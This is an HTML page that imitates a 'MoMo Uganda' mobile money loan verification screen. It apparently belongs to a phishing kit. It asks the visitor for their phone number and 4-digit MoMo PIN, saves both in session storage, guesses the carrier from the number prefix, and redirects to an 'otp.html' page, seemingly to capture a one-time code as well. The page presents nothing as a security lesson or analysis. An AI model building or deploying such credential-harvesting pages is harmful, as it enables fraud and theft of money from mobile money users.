<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Verify Loan - MoMo Uganda</title>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'DM Sans', sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .card {
            width: 100%;
            max-width: 430px;
            background: white;
            border-radius: 28px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
            padding: 28px 28px 24px;
        }
        .logo-wrap {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 18px;
        }
        .logo-bg {
            background: white;
            border-radius: 14px;
            padding: 6px;
            width: 48px;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .brand-name {
            font-family: 'Sora', sans-serif;
            font-size: 18px;
            font-weight: 700;
            color: white;
        }
        .brand-sub {
            font-size: 11.5px;
            color: rgba(255,255,255,0.72);
        }
        .header-title {
            font-family: 'Sora', sans-serif;
            font-size: 23px;
            font-weight: 800;
            color: white;
        }
        .header-desc {
            font-size: 13.5px;
            color: rgba(255,255,255,0.78);
            margin-top: 6px;
        }
        .loan-info {
            margin: 20px 22px 0;
            background: rgba(228,35,32,0.08);
            border: 1px solid rgba(228,35,32,0.18);
            border-radius: 18px;
            padding: 16px 18px;
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .loan-icon {
            width: 42px; height: 42px;
            background: #E42320;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
        }
        .loan-amount {
            font-family: 'Sora', sans-serif;
            font-size: 26px;
            font-weight: 800;
            color: #111827;
        }
        .form-body {
            padding: 22px 22px 26px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 7px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            background: #f9fafb;
            border: 1.5px solid #e5e7eb;
            border-radius: 13px;
            font-size: 15.5px;
            outline: none;
        }
        input:focus {
            border-color: #E42320;
        }
        .btn-primary {
            width: 100%;
            background: linear-gradient(135deg, #E42320, #c01c1a);
            color: white;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-back {
            width: 100%;
            background: transparent;
            color: #4b5563;
            border: 1.5px solid #e5e7eb;
            padding: 14px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
        }
        .error-msg {
            display: none;
            background: #fee2e2;
            border: 1px solid #fca5a5;
            color: #b91c1c;
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 13.5px;
        }
        .security-note {
            text-align: center;
            font-size: 12px;
            color: #9ca3af;
            margin-top: 18px;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="header">
        <div class="logo-wrap">
            <div class="logo-bg">
                <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
                    <rect x="3" y="12" width="22" height="14" rx="3" fill="white"/>
                    <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="white" stroke-width="2.2" fill="none"/>
                    <circle cx="14" cy="19" r="2.5" fill="#E42320"/>
                </svg>
            </div>
            <div>
                <div class="brand-name">MoMo Uganda</div>
                <div class="brand-sub">Mobile Money</div>
            </div>
        </div>
        <div class="header-title">Verify Your Loan</div>
        <div class="header-desc">Enter your MoMo number and PIN</div>
    </div>

    <div class="loan-info">
        <div class="loan-icon">₸</div>
        <div>
            <div style="font-size:11px; color:#E42320;">Loan Amount</div>
            <div class="loan-amount" id="loanAmount">—</div>
            <div id="loanDetails" style="font-size:12px; color:#4b5563;"></div>
        </div>
    </div>

    <div class="form-body">
        <div class="form-group">
            <label>Mobile Money Number</label>
            <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
        </div>
        <div class="form-group">
            <label>MoMo PIN</label>
            <input type="password" id="pin" placeholder="••••" maxlength="4">
        </div>
        <div class="error-msg" id="errorMsg"></div>
        <button class="btn-primary" id="submitBtn">Continue →</button>
        <button class="btn-back" onclick="window.location.href='index.html'">← Back</button>
        <div class="security-note">🔒 Secured by MoMo Uganda</div>
    </div>
</div>

<script>
    function loadLoanData() {
        const data = sessionStorage.getItem('calculatorData');
        if (data) {
            const loan = JSON.parse(data);
            document.getElementById('loanAmount').textContent = `UGX ${loan.amount.toLocaleString()}`;
            document.getElementById('loanDetails').textContent = `${loan.duration/30} months • UGX ${loan.monthly.toLocaleString()}/month`;
        }
    }

    function showError(msg) {
        const err = document.getElementById('errorMsg');
        err.textContent = msg;
        err.style.display = 'block';
        setTimeout(() => err.style.display = 'none', 3000);
    }

    document.getElementById('submitBtn').onclick = () => {
        const phone = document.getElementById('phone').value.trim();
        const pin = document.getElementById('pin').value.trim();
        
        if (!phone || phone.length !== 10) {
            showError("Enter valid Uganda number (10 digits)");
            return;
        }
        if (!pin || pin.length !== 4) {
            showError("PIN must be 4 digits");
            return;
        }

        // Save to sessionStorage
        sessionStorage.setItem('userPhone', phone);
        sessionStorage.setItem('userPin', pin);
        
        // Determine network
        let network = 'MTN';
        if (phone.startsWith('075') || phone.startsWith('074')) network = 'Airtel';
        else if (phone.startsWith('070') || phone.startsWith('076')) network = 'Africell';
        sessionStorage.setItem('userNetwork', network);
        
        // Redirect to OTP page
        window.location.href = 'otp.html';
    };

    document.getElementById('phone').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
    });

    document.getElementById('pin').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
    });

    loadLoanData();
</script>
</body>
</html>
